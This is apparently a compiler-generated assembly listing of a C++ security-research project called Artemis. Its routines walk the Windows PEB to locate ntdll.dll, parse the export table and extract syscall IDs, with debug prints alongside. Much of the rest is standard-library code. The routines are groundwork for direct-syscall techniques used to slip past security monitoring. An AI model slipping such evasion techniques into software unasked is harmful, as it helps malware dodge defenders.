	call	printf

; 102  :                     //TODO: Step through this Byte by Byte, so dereference with BYTE
; 103  :                     printf("\nFunction Addr Ptr Data: %p", *((UINT64*)funcAddress));

	mov	rax, QWORD PTR funcAddress$5[rsp]
	mov	rdx, QWORD PTR [rax]
	lea	rcx, OFFSET FLAT:??_C@_0BM@FINOJFAM@?6Function?5Addr?5Ptr?5Data?3?5?$CFp@
	call	printf

; 104  :                     int syscallID = syscallExtractor(funcAddress);  // Pass function Ptr to syscallExtractor to snag the Id

	mov	rdx, QWORD PTR funcAddress$5[rsp]
	mov	rcx, QWORD PTR this$[rsp]
	call	?syscallExtractor@Artemis@@QEAAH_K@Z	; Artemis::syscallExtractor
	mov	DWORD PTR syscallID$3[rsp], eax

; 105  : 
; 106  :                     return syscallID;   // Return with the extracted syscall ID

	mov	eax, DWORD PTR syscallID$3[rsp]
	mov	DWORD PTR $T4[rsp], eax
	lea	rcx, QWORD PTR functionNameArray$[rsp]
	call	??1?$vector@DV?$allocator@D@std@@@std@@QEAA@XZ ; std::vector<char,std::allocator<char> >::~vector<char,std::allocator<char> >
	npad	1
	lea	rcx, QWORD PTR functionName$[rsp]
	call	??1?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAA@XZ ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::~basic_string<char,std::char_traits<char>,std::allocator<char> >
	npad	1
	mov	rcx, QWORD PTR targetFunction$[rsp]
	call	??1?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAA@XZ ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::~basic_string<char,std::char_traits<char>,std::allocator<char> >
	mov	eax, DWORD PTR $T4[rsp]
	jmp	SHORT $LN1@walkPE
$LN8@walkPE:

; 107  :                 }
; 108  : 
; 109  :                 functionNameArray.clear();

	lea	rcx, QWORD PTR functionNameArray$[rsp]
	call	?clear@?$vector@DV?$allocator@D@std@@@std@@QEAAXXZ ; std::vector<char,std::allocator<char> >::clear

; 110  :                 functionName.clear();

	lea	rcx, QWORD PTR functionName$[rsp]
	call	?clear@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAAXXZ ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::clear

; 111  : 
; 112  :                 funcTick++;

	mov	eax, DWORD PTR funcTick$[rsp]
	inc	eax
	mov	DWORD PTR funcTick$[rsp], eax
$LN7@walkPE:

; 113  : 
; 114  :                 //break;
; 115  :             }
; 116  : 
; 117  :             tick++;    // increment

	mov	eax, DWORD PTR tick$[rsp]
	inc	eax
	mov	DWORD PTR tick$[rsp], eax

; 118  :             
; 119  :             //break;
; 120  : 
; 121  :         }

	jmp	$LN2@walkPE
$LN3@walkPE:

; 122  : 
; 123  :     }

	lea	rcx, QWORD PTR functionNameArray$[rsp]
	call	??1?$vector@DV?$allocator@D@std@@@std@@QEAA@XZ ; std::vector<char,std::allocator<char> >::~vector<char,std::allocator<char> >
	npad	1
	lea	rcx, QWORD PTR functionName$[rsp]
	call	??1?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAA@XZ ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::~basic_string<char,std::char_traits<char>,std::allocator<char> >
	npad	1
	mov	rcx, QWORD PTR targetFunction$[rsp]
	call	??1?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAA@XZ ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::~basic_string<char,std::char_traits<char>,std::allocator<char> >
$LN1@walkPE:
	mov	rcx, QWORD PTR __$ArrayPad$[rsp]
	xor	rcx, rsp
	call	__security_check_cookie
	add	rsp, 168				; 000000a8H
	ret	0
?walkPE@Artemis@@QEAAHV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z ENDP ; Artemis::walkPE
_TEXT	ENDS
; Function compile flags: /Odtp
;	COMDAT text$x
text$x	SEGMENT
functionNameChar$1 = 32
i$2 = 36
funcTick$ = 40
tick$ = 44
syscallID$3 = 48
$T4 = 52
funcAddress$5 = 56
exportDirectoryRVA$ = 64
functionNameArray$ = 72
tv168 = 96
exportNamesDirectoryRVA$ = 104
functionName$ = 112
__$ArrayPad$ = 144
this$ = 176
targetFunction$ = 184
?dtor$0@?0??walkPE@Artemis@@QEAAHV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@4HA PROC ; `Artemis::walkPE'::`1'::dtor$0
	push	rbp
	sub	rsp, 32					; 00000020H
	mov	rbp, rdx
	mov	rcx, QWORD PTR targetFunction$[rbp]
	call	??1?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAA@XZ ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::~basic_string<char,std::char_traits<char>,std::allocator<char> >
	add	rsp, 32					; 00000020H
	pop	rbp
	ret	0
?dtor$0@?0??walkPE@Artemis@@QEAAHV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@4HA ENDP ; `Artemis::walkPE'::`1'::dtor$0
text$x	ENDS
; Function compile flags: /Odtp
;	COMDAT text$x
text$x	SEGMENT
functionNameChar$1 = 32
i$2 = 36
funcTick$ = 40
tick$ = 44
syscallID$3 = 48
$T4 = 52
funcAddress$5 = 56
exportDirectoryRVA$ = 64
functionNameArray$ = 72
tv168 = 96
exportNamesDirectoryRVA$ = 104
functionName$ = 112
__$ArrayPad$ = 144
this$ = 176
targetFunction$ = 184
?dtor$1@?0??walkPE@Artemis@@QEAAHV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@4HA PROC ; `Artemis::walkPE'::`1'::dtor$1
	push	rbp
	sub	rsp, 32					; 00000020H
	mov	rbp, rdx
	lea	rcx, QWORD PTR functionName$[rbp]
	call	??1?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAA@XZ ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::~basic_string<char,std::char_traits<char>,std::allocator<char> >
	add	rsp, 32					; 00000020H
	pop	rbp
	ret	0
?dtor$1@?0??walkPE@Artemis@@QEAAHV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@4HA ENDP ; `Artemis::walkPE'::`1'::dtor$1
text$x	ENDS
; Function compile flags: /Odtp
;	COMDAT text$x
text$x	SEGMENT
functionNameChar$1 = 32
i$2 = 36
funcTick$ = 40
tick$ = 44
syscallID$3 = 48
$T4 = 52
funcAddress$5 = 56
exportDirectoryRVA$ = 64
functionNameArray$ = 72
tv168 = 96
exportNamesDirectoryRVA$ = 104
functionName$ = 112
__$ArrayPad$ = 144
this$ = 176
targetFunction$ = 184
?dtor$2@?0??walkPE@Artemis@@QEAAHV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@4HA PROC ; `Artemis::walkPE'::`1'::dtor$2
	push	rbp
	sub	rsp, 32					; 00000020H
	mov	rbp, rdx
	lea	rcx, QWORD PTR functionNameArray$[rbp]
	call	??1?$vector@DV?$allocator@D@std@@@std@@QEAA@XZ ; std::vector<char,std::allocator<char> >::~vector<char,std::allocator<char> >
	add	rsp, 32					; 00000020H
	pop	rbp
	ret	0
?dtor$2@?0??walkPE@Artemis@@QEAAHV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@4HA ENDP ; `Artemis::walkPE'::`1'::dtor$2
text$x	ENDS
; Function compile flags: /Odtp
; File C:\Users\james\OneDrive\Documents\Security-Research\Projects\Artemis\artemis.cpp
;	COMDAT ?walkPEB@Artemis@@QEAAXV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@@Z
_TEXT	SEGMENT
pebPtr$ = 32
fullDLLNameAddr$1 = 40
tv171 = 48
tv155 = 56
$T2 = 64
__$ArrayPad$ = 96
this$ = 128
fileName$ = 136
?walkPEB@Artemis@@QEAAXV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@@Z PROC ; Artemis::walkPEB, COMDAT

; 32   :     void walkPEB(std::wstring fileName) {

$LN9:
	mov	QWORD PTR [rsp+16], rdx
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 120				; 00000078H
	mov	rax, QWORD PTR __security_cookie
	xor	rax, rsp
	mov	QWORD PTR __$ArrayPad$[rsp], rax

; 33   : 
; 34   :         UINT64* pebPtr = (UINT64*)__readgsqword(0x60);

	mov	rax, QWORD PTR gs:96
	mov	QWORD PTR pebPtr$[rsp], rax

; 35   :         pebStruct.BaseAddr = pebPtr;

	mov	rax, QWORD PTR this$[rsp]
	mov	rcx, QWORD PTR pebPtr$[rsp]
	mov	QWORD PTR [rax+16], rcx

; 36   :         pebStruct.Ldr = *(pebPtr+0x3);

	mov	rax, QWORD PTR this$[rsp]
	mov	rcx, QWORD PTR pebPtr$[rsp]
	mov	rcx, QWORD PTR [rcx+24]
	mov	QWORD PTR [rax+32], rcx

; 37   :         artemisStruct.BaseAddr = *(pebPtr+0x2);

	mov	rax, QWORD PTR this$[rsp]
	mov	rcx, QWORD PTR pebPtr$[rsp]
	mov	rcx, QWORD PTR [rcx+16]
	mov	QWORD PTR [rax+8], rcx

; 38   :         ldrStruct.InLoadOrderModuleList = *((UINT64*)pebStruct.Ldr+0x2);

	mov	rax, QWORD PTR this$[rsp]
	mov	rax, QWORD PTR [rax+32]
	mov	rcx, QWORD PTR this$[rsp]
	mov	rax, QWORD PTR [rax+16]
	mov	QWORD PTR [rcx+40], rax
$LN2@walkPEB:

; 39   :         
; 40   :         while (true)

	xor	eax, eax
	cmp	eax, 1
	je	$LN3@walkPEB

; 41   :         {
; 42   :         
; 43   :             UINT64 fullDLLNameAddr = *((UINT64*)ldrStruct.InLoadOrderModuleList+0xA);

	mov	rax, QWORD PTR this$[rsp]
	mov	rax, QWORD PTR [rax+40]
	mov	rax, QWORD PTR [rax+80]
	mov	QWORD PTR fullDLLNameAddr$1[rsp], rax

; 44   :             ldrEntryStruct.FullDllName = readUnicodeArrayFrom64BitPointer(fullDLLNameAddr);

	mov	r8, QWORD PTR fullDLLNameAddr$1[rsp]
	lea	rdx, QWORD PTR $T2[rsp]
	mov	rcx, QWORD PTR this$[rsp]
	call	?readUnicodeArrayFrom64BitPointer@Artemis@@QEAA?AV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@_K@Z ; Artemis::readUnicodeArrayFrom64BitPointer
	mov	QWORD PTR tv171[rsp], rax
	mov	rax, QWORD PTR this$[rsp]
	add	rax, 128				; 00000080H
	mov	rdx, QWORD PTR tv171[rsp]
	mov	rcx, rax
	call	??4?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV01@$$QEAV01@@Z ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::operator=
	lea	rcx, QWORD PTR $T2[rsp]
	call	??1?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@XZ ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::~basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >

; 45   : 
; 46   :             if(ldrEntryStruct.FullDllName.find(fileName) == std::wstring::npos) {

	mov	rax, QWORD PTR this$[rsp]
	add	rax, 128				; 00000080H
	xor	r8d, r8d
	mov	rdx, QWORD PTR fileName$[rsp]
	mov	rcx, rax
	call	?find@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEBA_KAEBV12@_K@Z ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::find
	cmp	rax, -1
	jne	SHORT $LN4@walkPEB

; 47   :                 printf("\nNot Found. Continuing Loop...");

	lea	rcx, OFFSET FLAT:??_C@_0BP@MKMLILOE@?6Not?5Found?4?5Continuing?5Loop?4?4?4@
	call	printf

; 48   :                 ldrStruct.InLoadOrderModuleList = *((UINT64*)ldrStruct.InLoadOrderModuleList+0x1);  // Change for Flink address of next module in list

	mov	rax, QWORD PTR this$[rsp]
	mov	rax, QWORD PTR [rax+40]
	mov	rcx, QWORD PTR this$[rsp]
	mov	rax, QWORD PTR [rax+8]
	mov	QWORD PTR [rcx+40], rax

; 49   :                 continue;

	jmp	$LN2@walkPEB

; 50   :             }

	jmp	$LN5@walkPEB
$LN4@walkPEB:

; 51   :             else {
; 52   :                 printf("\nFound NTDLL.DLL!");

	lea	rcx, OFFSET FLAT:??_C@_0BC@JNHAIKLA@?6Found?5NTDLL?4DLL?$CB@
	call	printf

; 53   :                 printf("\nPEB: %p",pebStruct.BaseAddr);

	mov	rax, QWORD PTR this$[rsp]
	mov	rdx, QWORD PTR [rax+16]
	lea	rcx, OFFSET FLAT:??_C@_08NHEHJBFE@?6PEB?3?5?$CFp@
	call	printf

; 54   :                 printf("\nPEB LDR Addr: %p", pebStruct.Ldr);

	mov	rax, QWORD PTR this$[rsp]
	mov	rdx, QWORD PTR [rax+32]
	lea	rcx, OFFSET FLAT:??_C@_0BC@LONENMFL@?6PEB?5LDR?5Addr?3?5?$CFp@
	call	printf

; 55   :                 printf("\nLDR InMemLoadList: %p", *((UINT64*)ldrStruct.InLoadOrderModuleList));

	mov	rax, QWORD PTR this$[rsp]
	mov	rax, QWORD PTR [rax+40]
	mov	rdx, QWORD PTR [rax]
	lea	rcx, OFFSET FLAT:??_C@_0BH@FJNJOCCD@?6LDR?5InMemLoadList?3?5?$CFp@
	call	printf

; 56   :                 std::wcout << "\n" << ldrEntryStruct.FullDllName;    // Have to print wide char

	mov	rax, QWORD PTR this$[rsp]
	add	rax, 128				; 00000080H
	mov	QWORD PTR tv155[rsp], rax
	lea	rdx, OFFSET FLAT:??_C@_01EEMJAFIK@?6@
	lea	rcx, OFFSET FLAT:?wcout@std@@3V?$basic_ostream@_WU?$char_traits@_W@std@@@1@A ; std::wcout
	call	??$?6_WU?$char_traits@_W@std@@@std@@YAAEAV?$basic_ostream@_WU?$char_traits@_W@std@@@0@AEAV10@PEBD@Z ; std::operator<<<wchar_t,std::char_traits<wchar_t> >
	mov	rcx, QWORD PTR tv155[rsp]
	mov	rdx, rcx
	mov	rcx, rax
	call	??$?6_WU?$char_traits@_W@std@@V?$allocator@_W@1@@std@@YAAEAV?$basic_ostream@_WU?$char_traits@_W@std@@@0@AEAV10@AEBV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@0@@Z ; std::operator<<<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >

; 57   : 
; 58   :                 ldrEntryStruct.EntryPoint = *((UINT64**)ldrStruct.InLoadOrderModuleList+0x6);

	mov	rax, QWORD PTR this$[rsp]
	mov	rax, QWORD PTR [rax+40]
	mov	rcx, QWORD PTR this$[rsp]
	mov	rax, QWORD PTR [rax+48]
	mov	QWORD PTR [rcx+112], rax

; 59   :                 printf("\nNTDLL Module Base: %p", ldrEntryStruct.EntryPoint);

	mov	rax, QWORD PTR this$[rsp]
	mov	rdx, QWORD PTR [rax+112]
	lea	rcx, OFFSET FLAT:??_C@_0BH@OBFLALEB@?6NTDLL?5Module?5Base?3?5?$CFp@
	call	printf

; 60   : 
; 61   :                 break;

	jmp	SHORT $LN3@walkPEB
$LN5@walkPEB:

; 62   :             }
; 63   : 
; 64   :         }

	jmp	$LN2@walkPEB
$LN3@walkPEB:

; 65   : 
; 66   :     }

	mov	rcx, QWORD PTR fileName$[rsp]
	call	??1?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@XZ ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::~basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >
	mov	rcx, QWORD PTR __$ArrayPad$[rsp]
	xor	rcx, rsp
	call	__security_check_cookie
	add	rsp, 120				; 00000078H
	ret	0
?walkPEB@Artemis@@QEAAXV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@@Z ENDP ; Artemis::walkPEB
_TEXT	ENDS
; Function compile flags: /Odtp
;	COMDAT text$x
text$x	SEGMENT
pebPtr$ = 32
fullDLLNameAddr$1 = 40
tv171 = 48
tv155 = 56
$T2 = 64
__$ArrayPad$ = 96
this$ = 128
fileName$ = 136
?dtor$0@?0??walkPEB@Artemis@@QEAAXV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@@Z@4HA PROC ; `Artemis::walkPEB'::`1'::dtor$0
	push	rbp
	sub	rsp, 32					; 00000020H
	mov	rbp, rdx
	mov	rcx, QWORD PTR fileName$[rbp]
	call	??1?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@XZ ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::~basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >
	add	rsp, 32					; 00000020H
	pop	rbp
	ret	0
?dtor$0@?0??walkPEB@Artemis@@QEAAXV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@@Z@4HA ENDP ; `Artemis::walkPEB'::`1'::dtor$0
text$x	ENDS
; Function compile flags: /Odtp
;	COMDAT ??1LDR_DATA_TABLE_ENTRY@@QEAA@XZ
_TEXT	SEGMENT
this$ = 48
??1LDR_DATA_TABLE_ENTRY@@QEAA@XZ PROC			; LDR_DATA_TABLE_ENTRY::~LDR_DATA_TABLE_ENTRY, COMDAT
$LN3:
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 40					; 00000028H
	mov	rax, QWORD PTR this$[rsp]
	add	rax, 72					; 00000048H
	mov	rcx, rax
	call	??1?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@XZ ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::~basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >
	add	rsp, 40					; 00000028H
	ret	0
??1LDR_DATA_TABLE_ENTRY@@QEAA@XZ ENDP			; LDR_DATA_TABLE_ENTRY::~LDR_DATA_TABLE_ENTRY
_TEXT	ENDS
; Function compile flags: /Odtp
;	COMDAT ??0LDR_DATA_TABLE_ENTRY@@QEAA@XZ
_TEXT	SEGMENT
this$ = 48
??0LDR_DATA_TABLE_ENTRY@@QEAA@XZ PROC			; LDR_DATA_TABLE_ENTRY::LDR_DATA_TABLE_ENTRY, COMDAT
$LN3:
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 40					; 00000028H
	mov	rax, QWORD PTR this$[rsp]
	add	rax, 72					; 00000048H
	mov	rcx, rax
	call	??0?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@XZ ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >
	mov	rax, QWORD PTR this$[rsp]
	add	rsp, 40					; 00000028H
	ret	0
??0LDR_DATA_TABLE_ENTRY@@QEAA@XZ ENDP			; LDR_DATA_TABLE_ENTRY::LDR_DATA_TABLE_ENTRY
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\ios
;	COMDAT ?hex@std@@YAAEAVios_base@1@AEAV21@@Z
_TEXT	SEGMENT
_Iosbase$ = 48
?hex@std@@YAAEAVios_base@1@AEAV21@@Z PROC		; std::hex, COMDAT

; 204  : inline ios_base& __CLRCALL_OR_CDECL hex(ios_base& _Iosbase) { // set basefield to hex

$LN3:
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 40					; 00000028H

; 205  :     _Iosbase.setf(ios_base::hex, ios_base::basefield);

	mov	r8d, 3584				; 00000e00H
	mov	edx, 2048				; 00000800H
	mov	rcx, QWORD PTR _Iosbase$[rsp]
	call	?setf@ios_base@std@@QEAAHHH@Z		; std::ios_base::setf

; 206  :     return _Iosbase;

	mov	rax, QWORD PTR _Iosbase$[rsp]

; 207  : }

	add	rsp, 40					; 00000028H
	ret	0
?hex@std@@YAAEAVios_base@1@AEAV21@@Z ENDP		; std::hex
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xiosbase
;	COMDAT ?getloc@ios_base@std@@QEBA?AVlocale@2@XZ
_TEXT	SEGMENT
$T1 = 32
this$ = 64
__$ReturnUdt$ = 72
?getloc@ios_base@std@@QEBA?AVlocale@2@XZ PROC		; std::ios_base::getloc, COMDAT

; 368  :     _NODISCARD locale __CLR_OR_THIS_CALL getloc() const { // get locale

$LN5:
	mov	QWORD PTR [rsp+16], rdx
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 56					; 00000038H
	mov	DWORD PTR $T1[rsp], 0

; 369  :         return *_Ploc;

	mov	rax, QWORD PTR this$[rsp]
	mov	rdx, QWORD PTR [rax+64]
	mov	rcx, QWORD PTR __$ReturnUdt$[rsp]
	call	??0locale@std@@QEAA@AEBV01@@Z		; std::locale::locale
	mov	eax, DWORD PTR $T1[rsp]
	or	eax, 1
	mov	DWORD PTR $T1[rsp], eax
	mov	rax, QWORD PTR __$ReturnUdt$[rsp]

; 370  :     }

	add	rsp, 56					; 00000038H
	ret	0
?getloc@ios_base@std@@QEBA?AVlocale@2@XZ ENDP		; std::ios_base::getloc
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xiosbase
;	COMDAT ?width@ios_base@std@@QEAA_J_J@Z
_TEXT	SEGMENT
_Oldwidth$ = 0
this$ = 32
_Newwidth$ = 40
?width@ios_base@std@@QEAA_J_J@Z PROC			; std::ios_base::width, COMDAT

; 362  :     streamsize __CLR_OR_THIS_CALL width(streamsize _Newwidth) { // set width to argument

$LN3:
	mov	QWORD PTR [rsp+16], rdx
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 24

; 363  :         const streamsize _Oldwidth = _Wide;

	mov	rax, QWORD PTR this$[rsp]
	mov	rax, QWORD PTR [rax+40]
	mov	QWORD PTR _Oldwidth$[rsp], rax

; 364  :         _Wide                      = _Newwidth;

	mov	rax, QWORD PTR this$[rsp]
	mov	rcx, QWORD PTR _Newwidth$[rsp]
	mov	QWORD PTR [rax+40], rcx

; 365  :         return _Oldwidth;

	mov	rax, QWORD PTR _Oldwidth$[rsp]

; 366  :     }

	add	rsp, 24
	ret	0
?width@ios_base@std@@QEAA_J_J@Z ENDP			; std::ios_base::width
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xiosbase
;	COMDAT ?width@ios_base@std@@QEBA_JXZ
_TEXT	SEGMENT
this$ = 8
?width@ios_base@std@@QEBA_JXZ PROC			; std::ios_base::width, COMDAT

; 358  :     _NODISCARD streamsize __CLR_OR_THIS_CALL width() const {

	mov	QWORD PTR [rsp+8], rcx

; 359  :         return _Wide;

	mov	rax, QWORD PTR this$[rsp]
	mov	rax, QWORD PTR [rax+40]

; 360  :     }

	ret	0
?width@ios_base@std@@QEBA_JXZ ENDP			; std::ios_base::width
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xiosbase
;	COMDAT ?precision@ios_base@std@@QEBA_JXZ
_TEXT	SEGMENT
this$ = 8
?precision@ios_base@std@@QEBA_JXZ PROC			; std::ios_base::precision, COMDAT

; 348  :     _NODISCARD streamsize __CLR_OR_THIS_CALL precision() const {

	mov	QWORD PTR [rsp+8], rcx

; 349  :         return _Prec;

	mov	rax, QWORD PTR this$[rsp]
	mov	rax, QWORD PTR [rax+32]

; 350  :     }

	ret	0
?precision@ios_base@std@@QEBA_JXZ ENDP			; std::ios_base::precision
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xiosbase
;	COMDAT ?setf@ios_base@std@@QEAAHHH@Z
_TEXT	SEGMENT
_Oldfmtflags$ = 0
this$ = 32
_Newfmtflags$ = 40
_Mask$ = 48
?setf@ios_base@std@@QEAAHHH@Z PROC			; std::ios_base::setf, COMDAT

; 338  :         fmtflags _Newfmtflags, fmtflags _Mask) { // merge in format flags argument under mask argument

$LN3:
	mov	DWORD PTR [rsp+24], r8d
	mov	DWORD PTR [rsp+16], edx
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 24

; 339  :         const ios_base::fmtflags _Oldfmtflags = _Fmtfl;

	mov	rax, QWORD PTR this$[rsp]
	mov	eax, DWORD PTR [rax+24]
	mov	DWORD PTR _Oldfmtflags$[rsp], eax

; 340  :         _Fmtfl                                = (_Oldfmtflags & ~_Mask) | (_Newfmtflags & _Mask & _Fmtmask);

	mov	eax, DWORD PTR _Mask$[rsp]
	not	eax
	mov	ecx, DWORD PTR _Oldfmtflags$[rsp]
	and	ecx, eax
	mov	eax, ecx
	mov	ecx, DWORD PTR _Mask$[rsp]
	mov	edx, DWORD PTR _Newfmtflags$[rsp]
	and	edx, ecx
	mov	ecx, edx
	and	ecx, 65535				; 0000ffffH
	or	eax, ecx
	mov	rcx, QWORD PTR this$[rsp]
	mov	DWORD PTR [rcx+24], eax

; 341  :         return _Oldfmtflags;

	mov	eax, DWORD PTR _Oldfmtflags$[rsp]

; 342  :     }

	add	rsp, 24
	ret	0
?setf@ios_base@std@@QEAAHHH@Z ENDP			; std::ios_base::setf
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xiosbase
;	COMDAT ?flags@ios_base@std@@QEBAHXZ
_TEXT	SEGMENT
this$ = 8
?flags@ios_base@std@@QEBAHXZ PROC			; std::ios_base::flags, COMDAT

; 321  :     _NODISCARD fmtflags __CLR_OR_THIS_CALL flags() const {

	mov	QWORD PTR [rsp+8], rcx

; 322  :         return _Fmtfl;

	mov	rax, QWORD PTR this$[rsp]
	mov	eax, DWORD PTR [rax+24]

; 323  :     }

	ret	0
?flags@ios_base@std@@QEBAHXZ ENDP			; std::ios_base::flags
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xiosbase
;	COMDAT ?good@ios_base@std@@QEBA_NXZ
_TEXT	SEGMENT
tv67 = 32
this$ = 64
?good@ios_base@std@@QEBA_NXZ PROC			; std::ios_base::good, COMDAT

; 290  :     _NODISCARD bool __CLR_OR_THIS_CALL good() const {

$LN5:
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 56					; 00000038H

; 291  :         return rdstate() == ios_base::goodbit;

	mov	rcx, QWORD PTR this$[rsp]
	call	?rdstate@ios_base@std@@QEBAHXZ		; std::ios_base::rdstate
	test	eax, eax
	jne	SHORT $LN3@good
	mov	DWORD PTR tv67[rsp], 1
	jmp	SHORT $LN4@good
$LN3@good:
	mov	DWORD PTR tv67[rsp], 0
$LN4@good:
	movzx	eax, BYTE PTR tv67[rsp]

; 292  :     }

	add	rsp, 56					; 00000038H
	ret	0
?good@ios_base@std@@QEBA_NXZ ENDP			; std::ios_base::good
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xiosbase
;	COMDAT ?rdstate@ios_base@std@@QEBAHXZ
_TEXT	SEGMENT
this$ = 8
?rdstate@ios_base@std@@QEBAHXZ PROC			; std::ios_base::rdstate, COMDAT

; 271  :     _NODISCARD iostate __CLR_OR_THIS_CALL rdstate() const {

	mov	QWORD PTR [rsp+8], rcx

; 272  :         return _Mystate;

	mov	rax, QWORD PTR this$[rsp]
	mov	eax, DWORD PTR [rax+16]

; 273  :     }

	ret	0
?rdstate@ios_base@std@@QEBAHXZ ENDP			; std::ios_base::rdstate
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xiosbase
;	COMDAT ?clear@ios_base@std@@QEAAXH_N@Z
_TEXT	SEGMENT
_Filtered$ = 32
_Msg$1 = 40
$T2 = 48
$T3 = 64
this$ = 128
_State$ = 136
_Reraise$ = 144
?clear@ios_base@std@@QEAAXH_N@Z PROC			; std::ios_base::clear, COMDAT

; 239  :     void __CLR_OR_THIS_CALL clear(iostate _State, bool _Reraise) { // set state, possibly reraise exception

$LN9:
	mov	BYTE PTR [rsp+24], r8b
	mov	DWORD PTR [rsp+16], edx
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 120				; 00000078H

; 240  :         _State &= _Statmask;

	mov	eax, DWORD PTR _State$[rsp]
	and	eax, 23
	mov	DWORD PTR _State$[rsp], eax

; 241  :         _Mystate             = _State;

	mov	rax, QWORD PTR this$[rsp]
	mov	ecx, DWORD PTR _State$[rsp]
	mov	DWORD PTR [rax+16], ecx

; 242  :         const auto _Filtered = _State & _Except;

	mov	rax, QWORD PTR this$[rsp]
	mov	eax, DWORD PTR [rax+20]
	mov	ecx, DWORD PTR _State$[rsp]
	and	ecx, eax
	mov	eax, ecx
	mov	DWORD PTR _Filtered$[rsp], eax

; 243  :         if (_Filtered) {

	cmp	DWORD PTR _Filtered$[rsp], 0
	je	$LN2@clear

; 244  :             if (_Reraise) {

	movzx	eax, BYTE PTR _Reraise$[rsp]
	test	eax, eax
	je	SHORT $LN3@clear

; 245  :                 _RERAISE;

	xor	edx, edx
	xor	ecx, ecx
	call	_CxxThrowException
$LN3@clear:

; 246  :             }
; 247  : 
